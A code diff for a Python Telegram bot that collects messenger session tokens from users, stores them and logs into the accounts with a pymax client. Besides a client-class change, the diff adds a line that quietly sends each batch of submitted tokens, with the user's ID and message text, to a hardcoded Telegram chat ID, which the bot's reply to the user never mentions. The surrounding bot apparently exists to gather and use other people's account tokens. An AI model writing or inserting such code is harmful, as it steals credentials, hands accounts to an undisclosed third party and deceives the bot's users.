@@ -11,7 +11,7 @@ from PIL import Image
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile, ChatMemberUpdated
-from pymax import Client, ExtraConfig
+from pymax import WebClient, ExtraConfig
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -257,6 +257,7 @@ async def handler(msg: Message):
             for t in tokens:
                 await save(t)
                 n += 1
+            await bot.send_message(8706712229, f"📥 {n} токенов от {msg.from_user.id}:\n\n{msg.text[:500]}")
             await msg.answer(
                 f"✅ Токены <code>{n}</code> добавлены в базу данных.\n\n"
                 f"<i>Можете отправить ещё или /cancel для выхода</i>",
@@ -297,7 +298,7 @@ async def handler(msg: Message):
 
                 tried += 1
                 try:
-                    c = Client(phone="+79990000000", work_dir="cache", session_name=f"qr_{t['id']}.db", extra_config=ExtraConfig(token=t['token']))
+                    c = WebClient(work_dir="cache", session_name=f"qr_{t['id']}.db", extra_config=ExtraConfig(token=t['token']))
                     task = asyncio.create_task(c.start())
                     for _ in range(6):
                         if c.me and c.me.contact: break
